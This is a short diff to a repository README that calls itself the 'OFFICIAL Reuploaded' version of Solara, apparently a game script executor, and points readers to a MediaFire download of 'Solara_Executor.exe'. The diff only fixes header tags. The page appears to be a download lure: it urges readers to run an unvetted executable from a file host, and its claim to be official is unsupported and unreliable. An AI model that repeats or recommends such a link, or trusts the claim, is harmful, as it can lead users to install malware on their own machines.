@@ -14,9 +14,7 @@
 <p>
     This Repo is the OFFICIAL Reuploaded and fully updated and working version of Solara.
 
-</head>
-Download Link: 
-</head>
+<hi>Download Link: </h1>
 
 </p>
 https://www.mediafire.com/file/jmuaou8q8ex34bg/Solara_Executor.exe/file
